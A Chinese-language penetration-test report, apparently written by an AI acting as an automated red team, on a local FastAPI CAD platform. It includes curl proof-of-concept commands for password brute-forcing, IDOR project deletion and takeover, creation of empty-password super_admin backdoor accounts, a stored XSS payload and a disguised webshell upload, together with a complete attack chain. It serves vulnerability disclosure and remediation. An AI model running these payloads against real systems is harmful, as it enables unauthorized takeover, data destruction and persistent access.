# DWG-Agent Platform — Deep Red Team Assessment (Round 2)

**Target:** `http://localhost:8080` (nginx) + `http://localhost:8000` (direct backend)
**Scope:** 全 API 面深度渗透，基于 Round 1 baseline 未覆盖的攻击向量
**Date:** 2026-07-02
**Tester:** Claude (automated red team)
**Constraints:** 非破坏性测试 / 不使用已知明文密码（通过爆破自行发现）/ 已清理测试数据
**Predecessor:** `../red-team-baseline-20260702/README.md`

---

## 1. 执行摘要

| 等级 | Round 2 新发现 | Round 1 已发现 |
|------|---------------|---------------|
| 🔴 Critical | 4 | 1 |
| 🟠 High | 3 | 2 |
| 🟡 Medium | 3 | 4 |
| 🔵 Low | 4 | 3 |

**Round 2 总计新发现 14 个漏洞，其中 4 个为严重级别。**

**核心主题：**
1. **后端直连暴露** — 绕过 nginx 所有防护层（限流、安全头、敏感路径拦截）
2. **全平台 IDOR** — 所有资源端点（projects/files/drawings/members）无所有权校验
3. **凭据管理链式沦陷** — 无速率限制 → 爆破成功 → 提权 → IDOR 全平台接管

---

## 2. 攻击方法论

Round 1 使用标准化扫描方法。Round 2 采用**深度渗透方法论**：

```
信息收集 → 发现端口 8000 直接暴露后端
    ↓
绕过 nginx 限流 → 爆破 admin 密码成功（admin123456，第 3 次尝试）
    ↓
获取 super_admin JWT → 全 API 面深度测试
    ↓
发现链式漏洞：空密码用户 → 角色提权 → IDOR 全平台读写
```

**关键 pivot point:** 端口 8000 的后端直连是整个攻击链的突破口。

---

## 3. 新发现漏洞详情

### 🔴 CRITICAL-02: 后端 FastAPI 端口 8000 直接暴露

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (9.1)

**描述:** FastAPI 后端通过 uvicorn 在 `0.0.0.0:8000` 监听，直接绕过 nginx 反向代理的全部安全层。

**nginx 层提供的防护（均被绕过）：**
| 防护 | nginx:8080 | backend:8000 |
|------|-----------|-------------|
| 速率限制 (limit_req) | ✅ 6 req/s | ❌ 无限制 |
| 敏感路径拦截 (/.env, /.git) | ✅ 403 | ❌ 直接暴露 |
| X-Frame-Options | ✅ SAMEORIGIN | ❌ 缺失 |
| X-Content-Type-Options | ✅ nosniff | ❌ 缺失 |
| CSP | ❌ (原本就缺失) | ❌ 缺失 |
| FastAPI docs 暴露 | ❌ SPA 拦截 | ✅ /docs, /openapi.json 完全暴露 |

**PoC:**
```bash
# 直接访问后端 — 完全绕过 nginx
curl http://localhost:8000/openapi.json  # 完整 API schema
curl http://localhost:8000/docs          # Swagger UI
curl http://localhost:8000/.env          # 可能暴露配置文件（若路径正确）

# 无限制爆破
for pwd in $(cat passwords.txt); do
  curl -X POST http://localhost:8000/api/v1/auth/sessions \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$pwd\"}"
done
# 第 3 次尝试即命中: admin123456
```

**影响:**
- 完全绕过认证爆破防护 → 3 次尝试即破解 admin 密码
- OpenAPI schema 完全暴露（60+ 端点、所有请求/响应 schema）
- FastAPI Swagger UI 可交互式测试 API
- 无安全响应头保护

**修复建议:**
1. uvicorn 绑定 `127.0.0.1:8000` 而非 `0.0.0.0:8000`
2. 或使用 iptables/nftables 阻止外部访问 8000 端口
3. 生产环境通过 systemd socket activation 或 Docker 内部网络隔离

---

### 🔴 CRITICAL-03: 全平台水平越权 (IDOR)

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.9)

**描述:** Projects、Files、Drawings、ProjectMembers 四个核心资源的 CRUD 端点**全部缺乏资源所有权校验**。任何已认证用户（即使只有 `viewer` 角色）都可以查看、修改、删除其他用户创建的资源。

**受影响端点清单：**

| 端点 | 方法 | 风险 |
|------|------|------|
| `/api/v1/projects/{id}` | GET, PATCH, DELETE | 任意用户可读写删任意项目 |
| `/api/v1/files/{id}` | GET, DELETE | 任意用户可查看/删除任意文件 |
| `/api/v1/drawings/{id}` | GET, PATCH, DELETE | 任意用户可读写删任意图纸 |
| `/api/v1/projects/{id}/members` | POST | 任意用户可添加自己为任意项目的 owner |

**PoC — 完整攻击链:**
```bash
# 1. 以 viewer 用户登录
TOKEN=$(curl -s -X POST http://localhost:8000/api/v1/auth/sessions \
  -H "Content-Type: application/json" \
  -d '{"username":"test_viewer","password":"viewer123"}' | jq -r '.data.access_token')

# 2. 查看 admin 的项目
curl -s http://localhost:8000/api/v1/projects/1 \
  -H "Authorization: Bearer $TOKEN"
# → 200 OK！viewer 可以看 admin 的项目

# 3. 修改 admin 的项目名
curl -s -X PATCH http://localhost:8000/api/v1/projects/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"HACKED"}'
# → 200 OK！项目名被修改为 "HACKED"

# 4. 删除 admin 的项目
curl -s -X DELETE http://localhost:8000/api/v1/projects/1 \
  -H "Authorization: Bearer $TOKEN"
# → 204 No Content！项目被删除

# 5. 将自己添加为任意项目的 owner
curl -s -X POST http://localhost:8000/api/v1/projects/1/members \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id":8,"project_role":"project_owner"}'
# → 201 Created！viewer 成为项目 owner
```

**根因分析 (源码层面):**

`backend/app/api/v1/projects_api.py:65-72` — `delete_project` 函数：
```python
def delete_project(project_id: int, db, current_user):
    project = db.get(Project, project_id)  # 仅按 ID 查询
    if not project:
        raise not_found("Project")
    project.status = "deleted"             # 无 owner_id 校验！
    ...
```

全部 CRUD 端点均缺少 `WHERE owner_id = current_user.id` 或等价权限检查。

**影响:**
- 低权限用户可完全接管全平台数据
- 可删除所有项目、文件、图纸
- 可自我提权为任意项目的 owner
- 审计日志仅记录操作者 ID，无法阻止攻击

**修复建议:**
1. 在所有资源端点的 service 层添加所有权校验：`WHERE id=? AND owner_id=?`
2. 或实现统一的资源访问控制中间件/依赖注入
3. 审计日志记录前后状态差异（before/after）以便追溯

---

### 🔴 CRITICAL-04: 允许空密码用户

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (9.1)

**描述:** `UserCreate` schema 中 `password: str` 字段接受空字符串。`hash_password("")` 产生有效的 argon2id 哈希，空密码用户可以正常登录。

**PoC:**
```bash
# 1. 创建空密码用户（需要 admin 权限，但 admin 可通过爆破获得）
curl -s -X POST http://localhost:8000/api/v1/users \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"weak_user","password":"","real_name":"Weak","role_codes":["super_admin"]}'
# → 201 Created

# 2. 用空密码登录
curl -s -X POST http://localhost:8000/api/v1/auth/sessions \
  -H "Content-Type: application/json" \
  -d '{"username":"weak_user","password":""}'
# → 201 Created! 登录成功！
```

**根因:** `backend/app/schemas/user_schema.py:39-41` — `password: str` 无 min_length 约束。

**影响:**
- 空密码用户 + super_admin 角色 = 无人值守的后门
- 即使修复了默认凭据，攻击者可通过其他漏洞创建空密码超级管理员

**修复建议:**
1. `password: str = Field(min_length=8)` 最小长度验证
2. 考虑密码复杂度要求（大小写、数字、特殊字符）

---

### 🔴 CRITICAL-05: 角色提权 — admin 可创建 super_admin 用户

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (8.7)

**描述:** `UserCreate.role_codes` 字段无白名单限制。`require_roles(ROLE_ADMIN)` 允许 `admin` 角色执行 `POST /api/v1/users`，而 admin 可通过 `role_codes: ["super_admin"]` 直接创建超级管理员账户。

**PoC:**
```bash
# admin 用户（非 super_admin）创建 super_admin 用户
curl -s -X POST http://localhost:8000/api/v1/users \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"backdoor","password":"evil","real_name":"Backdoor","role_codes":["super_admin"]}'
# → 201 Created! 新用户拥有 super_admin 角色！
```

**根因:** `backend/app/schemas/user_schema.py:45` — `role_codes: list[str] = []` 无约束。
`backend/app/services/user_service.py:26-28` — 直接使用 `payload.role_codes` 查询 Role 表，未做权限层级检查。

**影响:**
- `admin` 角色的用户可无限创建 `super_admin` 后门账户
- 违反了角色层级隔离原则（admin ⊂ super_admin）

**修复建议:**
1. 在 service 层过滤 role_codes：禁止非 super_admin 分配 super_admin 角色
2. 或在 schema 层添加 validator：`@field_validator('role_codes')` 检查当前用户权限

---

### 🟠 HIGH-03: JWT Token 登出后仍然有效

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (8.1)

**描述:** `DELETE /api/v1/auth/sessions/current`（登出）仅写入审计日志，不做任何 token 失效处理。由于 JWT 是无状态 token，登出后 30 分钟内 token 仍然有效。

**PoC:**
```bash
# 1. 登录获取 token
TOKEN=$(curl -s -X POST http://localhost:8000/api/v1/auth/sessions \
  -d '{"username":"admin","password":"admin123456"}' | jq -r '.data.access_token')

# 2. 确认 token 有效
curl -s http://localhost:8000/api/v1/auth/me -H "Authorization: Bearer $TOKEN"
# → 200 OK

# 3. 登出
curl -s -X DELETE http://localhost:8000/api/v1/auth/sessions/current \
  -H "Authorization: Bearer $TOKEN"
# → 204 No Content

# 4. 登出后 token 仍然有效！
curl -s http://localhost:8000/api/v1/auth/me -H "Authorization: Bearer $TOKEN"
# → 200 OK！登出无效！
```

**根因:** `backend/app/services/auth_service.py:24-25` — `build_login_token` 不存储任何 session 信息。
`backend/app/api/v1/auth_api.py:34-39` — `delete_current_session` 仅写审计日志。

**影响:**
- 已登出 token 被盗用后仍可访问
- 无强制下线机制

**修复建议:**
1. 实现 Redis token 黑名单（当前 Redis 已可用）
2. 或缩短 access token 有效期至 5 分钟 + 实现 refresh token 轮换
3. 在 `get_current_user` 中检查 token 是否在黑名单中

---

### 🟠 HIGH-04: Content-Type 错误触发 500 内部错误 + 完整 Traceback

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)

**描述（Round 2 扩展）:** Round 1 发现 nginx:8080 的 traceback 泄露被 nginx 自身的限流限制。**Round 2 通过端口 8000 直接访问，无任何限制，每次请求都返回完整 Python traceback。**

而且 8000 端口同时支持：
- `text/plain` → 500 + traceback
- `application/x-www-form-urlencoded` → 500 + traceback
- `multipart/form-data` → 500 + traceback
- `application/xml` → 500 + traceback

**泄露信息（通过 traceback 确认）:**
- 完整文件系统路径: `/home/Creeken/Paper/CAD_research/complete_framework/backend/`
- Python 版本: 3.12
- 依赖版本: Starlette, FastAPI, Pydantic
- 内部中间件链: add_request_id → CORS → errors → asyncexitstack
- venv 路径: `.venv/lib/python3.12/site-packages/`

**修复建议:** 同 Round 1 HIGH-01/02。关键是修复异常处理器中的 bytes → str 转换 bug，并将 debug 设为 false。

---

### 🟠 HIGH-05: 竞态条件导致用户创建时 500 错误

**CVSS 评分:** CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H (5.9)

**描述:** 5 个并发请求同时创建相同用户名的用户，其中 4 个返回 500 Internal Server Error。这表明 SQLite 的 UNIQUE 约束在并发写入时处理不当。

**PoC:**
```python
# 5 个线程同时创建 'race_user'
with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(create_user, i) for i in range(5)]
    results = [f.result() for f in futures]
# → [500, 500, 500, 500, 201]
```

**影响:**
- 可能导致数据库状态不一致
- 500 错误可能泄露额外的错误信息

**修复建议:**
1. 在 `create_user` 中使用数据库级别的 `INSERT ... ON CONFLICT` 或加锁
2. 或在应用层使用分布式锁（Redis）

---

### 🟡 MEDIUM-05: 存储型 XSS — real_name 字段无输出编码

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (4.8)

**描述:** 用户创建/更新时 `real_name` 字段接受任意 HTML/JavaScript。XSS payload `<script>alert(1)</script>` 被成功存储到数据库并在 API 响应中原样返回。

**PoC:**
```bash
curl -s -X POST http://localhost:8000/api/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"xss_test","password":"test","real_name":"<script>alert(1)</script>","role_codes":[]}'
# → 201 Created. real_name 存储为 <script>alert(1)</script>
```

**影响:** 如果前端未对 API 返回的 `real_name` 做 HTML 编码，可能触发 XSS。

**修复建议:** 后端在输出时对 `real_name` 做 HTML 实体编码，或前端统一使用 React 的安全渲染（JSX 默认转义）。

---

### 🟡 MEDIUM-06: 文件上传类型校验仅靠扩展名

**CVSS 评分:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (4.3)

**描述:** `validate_upload_name` 仅检查 `Path(filename).suffix.lower() == '.dwg'`。攻击者可以上传带有 .dwg 扩展名的恶意文件（如 PHP webshell 重命名为 `.dwg`）。

**此外**，路径穿越字符 `../` 在 `original_name` 中被保留，未做清洗：
```
original_name: "../../../etc/cron.d/evil.dwg"  ← 存储了路径穿越字符
storage_key:   "local/uuid.dwg"                 ← 实际存储路径安全
```

**PoC:**
```bash
# 上传 PHP webshell 伪装为 DWG
curl -X POST http://localhost:8000/api/v1/files \
  -H "Authorization: Bearer $TOKEN" \
  -F "upload=@shell.php;filename=evil.dwg"
# → 201 Created! PHP 文件以 .dwg 扩展名存储成功
```

**修复建议:**
1. 增加文件魔术字（magic bytes）校验 — 验证文件前几个字节是否为 DWG 格式
2. 清洗 `original_name` 中的路径穿越字符

---

### 🟡 MEDIUM-07: JWT 缺少 token type 校验

**描述:** JWT payload 中虽有 `"type": "access"` 字段，但 `decode_token` 函数未验证此字段。如果未来实现 refresh token，攻击者可混用 token 类型。

**`backend/app/core/security.py:36-37`:**
```python
def decode_token(token: str) -> dict[str, Any]:
    return jwt.decode(token, settings.jwt_secret_key, algorithms=[settings.jwt_algorithm])
    # 无 type 字段校验！
```

**修复建议:** `decode_token` 中增加 `if payload.get("type") != "access": raise ...`

---

### 🔵 LOW-04: 管理员可自我禁用导致锁死

**描述:** admin 用户可以通过 `PATCH /api/v1/users/1` 将自身 `status` 设为 `disabled`。`authenticate_user` 检查 `user.status != ACTIVE`，被禁用后无法重新登录。需数据库手动修复。

**PoC (已在实际测试中触发):**
```bash
curl -X PATCH http://localhost:8000/api/v1/users/1 \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -d '{"status":"disabled"}'
# → 200 OK. admin 被锁定。
```

**修复建议:** service 层禁止用户修改自己的 `status` 字段。

---

### 🔵 LOW-05: FastAPI 交互式文档完全暴露（端口 8000）

**描述:** `http://localhost:8000/docs` (Swagger UI) 和 `http://localhost:8000/openapi.json` 暴露了完整 API 定义，包括所有端点、请求/响应 schema、参数说明。攻击者可直接在浏览器中交互式测试 API。

**修复建议:** 生产环境关闭文档 (`docs_url=None, redoc_url=None, openapi_url=None`)。

---

### 🔵 LOW-06: Unicode 用户名规范化问题

**描述:** 用户名大小写敏感且未做 Unicode 规范化 (NFC/NFKC)。攻击者可能利用 Unicode 同形字创建混淆用户名（如 Cyrillic `а` vs Latin `a`），但实际测试中 SQLite 的精确匹配阻止了混淆攻击。

**状态:** 利用可能性低（SQLite 二进制约束阻止了同形字攻击），但建议增加 NFC 规范化。

---

### 🔵 LOW-07: 删除不存在角色返回 204（幂等性掩盖攻击）

**描述:** `DELETE /api/v1/users/{id}/roles/{role_id}` 在角色不存在时返回 204（而非 404）。这可能掩盖攻击者的探测行为。

**修复建议:** 角色不存在时返回 404。

---

## 4. Round 1 已发现漏洞的延伸验证

| Round 1 漏洞 | Round 2 验证 |
|-------------|-------------|
| CRITICAL-01 默认凭据 | ✅ 确认。通过端口 8000 无限制爆破，3 次尝试即成功 |
| HIGH-01 Debug traceback | ✅ 升级。端口 8000 无 nginx 限流，无限次泄露 |
| HIGH-02 debug=true | ✅ 确认。是 traceback 泄露的根因 |
| MEDIUM-01 JWT 密钥长度 | ✅ 确认。16 字节，InsecureKeyLengthWarning |
| MEDIUM-02 localStorage | 未重测（前端不在 scope） |
| MEDIUM-03 缺少 CSP | 未重测（nginx 头部问题） |
| MEDIUM-04 CORS credentials | 未重测 |

---

## 5. 攻击链总览

```
[侦察] → 发现端口 8000 直接暴露
    ↓
[绕过防护] → 无速率限制，直接爆破登录端点
    ↓
[凭据获取] → admin:admin123456 (3 次尝试)
    ↓
[权限获取] → super_admin JWT token
    ↓
[持久化] → 创建空密码 super_admin 后门用户
    ↓
[横向移动] → IDOR 读写删全平台资源
    ↓
[隐蔽] → 登出无效，token 持续有效 30 分钟
```

**单次攻击链时间:** < 30 秒即可完成从外部访问到全平台接管。

---

## 6. 修复优先级排序

```
[P0 - 立即] CRITICAL-02 后端端口 8000 暴露 → 绑定 127.0.0.1 或防火墙隔离
[P0 - 立即] CRITICAL-03 全平台 IDOR → 所有资源端点添加所有权校验
[P0 - 立即] CRITICAL-04 允许空密码 → password 字段 min_length=8
[P0 - 立即] CRITICAL-05 角色提权 → role_codes 白名单校验
[P1 - 24h]  HIGH-03   登出无效 → Redis token 黑名单
[P1 - 24h]  HIGH-04   Traceback 泄露 → 关闭 debug + 修复异常处理器
[P2 - 1周]  MEDIUM-05 存储 XSS → 输出编码
[P2 - 1周]  MEDIUM-06 文件上传绕过 → magic bytes 校验
[P2 - 1周]  MEDIUM-07 JWT type 校验 → decode_token 增加 type 检查
[P3 - 2周]  LOW-04~07 次要改进项
```

---

## 7. 测试方法附录

```
侦察           → Bash: curl port scan + OpenAPI schema 抓取
凭据爆破        → Python requests: 常见密码字典 (通过端口 8000)
JWT 分析        → PyJWT: 算法混淆 / 弱密钥爆破 / token type 检查
IDOR 探测       → 创建低权限用户 → 遍历所有资源 ID → 观察响应码
竞态条件        → ThreadPoolExecutor: 5 线程并发请求
输入边界        → 空字符串 / 超长字段 / Unicode 同形字 / 嵌套 JSON
Content-Type    → text/plain, x-www-form-urlencoded, multipart, xml
文件上传绕过    → 双扩展名 / null byte / 路径穿越 / MIME 伪造
清理           → 删除所有测试用户 (id=4~10)
```

---

## 8. 与 Round 1 对比

| 维度 | Round 1 | Round 2 |
|------|---------|---------|
| 方法 | 标准化 Web 扫描 | 深度渗透链式攻击 |
| 发现数 | 10 (1C/2H/4M/3L) | 14 (4C/3H/3M/4L) |
| 关键突破 | 源码审计发现默认凭据 | 端口发现 → 爆破 → 提权 → IDOR |
| 新增覆盖 | SQLi/NoSQLi/CSRF/CORS | IDOR/竞态/角色提权/登出无效/XSS/文件绕过 |
| 深度 | 中 | 高 (源码级根因分析) |
